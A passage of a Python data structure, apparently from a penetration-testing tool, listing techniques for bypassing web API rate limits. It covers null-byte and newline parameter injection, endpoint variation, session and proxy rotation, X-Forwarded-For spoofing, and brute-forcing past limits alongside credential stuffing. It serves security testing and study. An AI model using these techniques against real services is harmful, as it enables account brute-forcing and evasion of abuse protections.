                            'Rate limit applied to batch operations',
                            'Batch endpoint requires auth',
                            'Array operations rejected'
                        ],
                        'next_steps': [
                            'If found, test batch size limits',
                            'Combine multiple attack vectors in batch',
                            'Document batch endpoint format',
                            'Test for IDOR in batch operations'
                        ],
                        'notes': 'Legacy APIs may expose unprotected batch endpoints. Check for /v2/batch, /api/bulk, /_bulk_docs patterns.'
                    }
                },
                {
                    'id': f'rate-timing-window-{port}',
                    'name': 'Sliding Window Rate Limit Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit sliding window rate limit by timing requests to window resets',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Trigger rate limit, note X-RateLimit-Reset header',
                            'Manual: Send max requests 5 seconds before window reset',
                            'Manual: Immediately send another burst after reset',
                            'Manual: Double throughput by timing window boundaries',
                            'Watch for error: "Rate limit resets in 27 seconds"',
                            'Script: Sleep until window reset, fire burst'
                        ],
                        'success_indicators': [
                            'Window reset time predictable',
                            'Double throughput achieved',
                            'Max requests before + after window = 2x normal',
                            'Fixed window boundary detected'
                        ],
                        'failure_indicators': [
                            'Sliding window without fixed boundary',
                            'No reset time exposed',
                            'Token bucket with gradual refill',
                            'Timing has no advantage'
                        ],
                        'next_steps': [
                            'If exploitable, automate timing script',
                            'Calculate optimal burst timing',
                            'Combine with other bypass techniques',
                            'Document window duration (60s, 300s, etc)'
                        ],
                        'notes': 'Classic token bucket bypass. Fire max requests at t=59s, then again at t=0s. 2x throughput without other bypasses!'
                    }
                },
                {
                    'id': f'rate-blank-characters-{port}',
                    'name': 'Blank Character Injection Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass rate limits by injecting blank characters in parameters',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Add %00 null byte to code parameter: code=1234%00',
                            'Manual: Add newline: email=user@test.com%0a',
                            'Manual: Add carriage return: email=user@test.com%0d',
                            'Manual: Add tab: username=admin%09',
                            'Manual: Add space: code=1234%20',
                            'Burp Intruder: Test %00, %0d, %0a, %09, %0C, %20 variations'
                        ],
                        'success_indicators': [
                            'Different rate limit bucket per variation',
                            'Blank characters treated as unique values',
                            'Rate limit reset with character injection',
                            'Backend normalizes but rate limiter doesnt'
                        ],
                        'failure_indicators': [
                            'Input sanitization strips blank chars',
                            'Same rate limit bucket',
                            'Character injection blocked',
                            'Proper normalization before rate limit'
                        ],
                        'next_steps': [
                            'If bypass works, automate character variations',
                            'Test all blank chars: \\0, \\r, \\n, \\t, space',
                            'Combine with email variations (user+1@test.com)',
                            'Document which characters work'
                        ],
                        'notes': 'Blank char injection tricks rate limiter into treating email@test.com and email@test.com%0a as different. Try null bytes first!'
                    }
                },
                {
                    'id': f'rate-endpoint-variation-{port}',
                    'name': 'Endpoint Variation Rate Limit Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass rate limits by accessing variations of same endpoint',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'alternatives': [
                            'Manual: Test /api/v3/sign-up, /api/v2/sign-up, /api/v1/sign-up',
                            'Manual: Try /SignUp, /Signup, /signup, /sign-up, /sign_up',
                            'Manual: Add parameters: /resetpwd?someparam=1',
                            'Manual: Try /api/sign-up vs /sign-up',
                            'ffuf: Fuzz API versions and case variations',
                            'Check if rate limit is per-endpoint or global'
                        ],
                        'success_indicators': [
                            'Different endpoints bypass rate limit',
                            'Case variations treated as separate',
                            'API versions have separate limits',
                            'Parameter addition resets limit'
                        ],
                        'failure_indicators': [
                            'Rate limit applies to all variations',
                            'Endpoint normalization before rate limit',
                            'Global rate limit regardless of path',
                            'All variations protected'
                        ],
                        'next_steps': [
                            'If bypass works, enumerate all endpoint variations',
                            'Rotate through working endpoints',
                            'Document functional equivalents',
                            'Test legacy API paths'
                        ],
                        'notes': 'API gateways may rate limit per-endpoint. /api/v1/login and /api/v2/login = separate buckets! Test case variations too.'
                    }
                },
                {
                    'id': f'rate-session-rotation-{port}',
                    'name': 'Session/Cookie Rotation Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass session-based rate limiting by rotating session tokens',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Login/logout between attempts',
                            'Manual: Clear cookies every N requests',
                            'Manual: Use Pitchfork attack with credential rotation',
                            'Burp: Rotate session cookies from multiple accounts',
                            'Check if rate limit is session-based vs IP-based',
                            'Test if new session resets rate limit counter'
                        ],
                        'success_indicators': [
                            'New session bypasses rate limit',
                            'Rate limit counter resets on logout/login',
                            'Session-based rate limiting confirmed',
                            'Multiple sessions allow more attempts'
                        ],
                        'failure_indicators': [
                            'Rate limit persists across sessions',
                            'IP-based rate limiting enforced',
                            'Account lockout after N attempts',
                            'Global rate limit regardless of session'
                        ],
                        'next_steps': [
                            'If viable, automate session rotation',
                            'Create multiple test accounts',
                            'Combine with credential stuffing',
                            'Document rate limit implementation'
                        ],
                        'notes': 'Weak session-based rate limits. If limit = 5/session and you have 10 accounts = 50 total attempts before IP lockout.'
                    }
                },
                {
                    'id': f'rate-user-agent-rotation-{port}',
                    'name': 'User-Agent & Header Rotation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass rate limits by rotating User-Agent and other request headers',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'alternatives': [
                            'Burp Intruder: User-Agent header from wordlist',
                            'Manual: Rotate common browsers (Chrome, Firefox, Safari)',
                            'Manual: Change Referer header',
                            'Manual: Rotate Accept-Language header',
                            'Manual: Change Accept-Encoding header',
                            'Tool: hashtag-fuzz with header randomization'
                        ],
                        'success_indicators': [
                            'Different User-Agents treated as separate clients',
                            'Rate limit resets with header changes',
                            'Fingerprinting based on headers',
                            'More attempts possible with rotation'
                        ],
                        'failure_indicators': [
                            'Header changes ignored',
                            'IP-based rate limiting only',
                            'No effect on rate limit',
                            'Sophisticated fingerprinting'
                        ],
                        'next_steps': [
                            'If bypass works, automate header rotation',
                            'Combine with IP spoofing headers',
                            'Test which headers affect rate limit',
                            'Document header-based tracking'
                        ],
                        'notes': 'Low success rate but worth trying. Some rate limiters use User-Agent + IP for tracking. Combine with X-Forwarded-For spoofing!'
                    }
                },
                {
                    'id': f'rate-proxy-rotation-{port}',
                    'name': 'Proxy Network Rate Limit Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass IP-based rate limiting using proxy rotation',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'NOISY'],
                        'alternatives': [
                            'Tool: FireProx (AWS API Gateway for IP rotation)',
                            'Burp: IPRotate extension with SOCKS/HTTP proxies',
                            'Manual: Rotate through proxy list every N requests',
                            'Tool: ProxyChains with proxy rotation',
                            'Burp Turbo Intruder: Built-in proxy rotation',
                            'Check rate limit per IP vs per proxy'
                        ],
                        'success_indicators': [
                            'Each proxy IP has separate rate limit',
                            'Unlimited attempts with proxy rotation',
                            'IP-based rate limiting confirmed',
                            'Successful brute-force via proxies'
                        ],
                        'failure_indicators': [
                            'Proxy IPs blocked',
                            'Account-based rate limiting',
                            'Proxy detection mechanisms',
                            'Rate limit persists across IPs'
                        ],
                        'next_steps': [
                            'If successful, deploy proxy pool',
                            'Use residential proxies (harder to detect)',
                            'Combine with other bypass techniques',
                            'Monitor proxy health/rotation'
                        ],
                        'notes': 'FireProx creates disposable AWS API Gateway endpoints = different source IP per request. Expensive but effective! Burp IPRotate cheaper alternative.'
                    }
                },
                {
                    'id': f'rate-keep-trying-{port}',
                    'name': 'Valid Response Despite Rate Limit',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if valid credentials return different response even when rate limited',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'alternatives': [
                            'Manual: Trigger rate limit with wrong credentials',
                            'Manual: Continue sending requests past limit',
                            'Manual: Note response for wrong credential (401)',
                            'Manual: Send request with CORRECT credential',
                            'Manual: Check if response differs (200 vs 401)',
                            'Burp: Monitor response codes during brute-force'
                        ],
                        'success_indicators': [
                            'Rate limited but valid cred returns 200 OK',
                            'Different response code for correct credential',
                            'Rate limit blocks attempts but doesnt hide success',
                            'Error message differs for valid vs invalid'
                        ],
                        'failure_indicators': [
                            'All responses identical when rate limited',
                            'No way to distinguish valid from invalid',
                            'Rate limit completely blocks verification',
                            'Same 401/429 for all attempts'
                        ],
                        'next_steps': [
                            'If detectable, continue brute-force past rate limit',
                            'Document exact response difference',
                            'Automate detection of valid credentials',
                            'Report as rate limit bypass'
                        ],
                        'notes': '2023 bug bounty finding! Rate limit triggers 401 for wrong creds, but 200 for correct creds. Check response codes AFTER rate limit!'
                    }
                }
            ]
        }
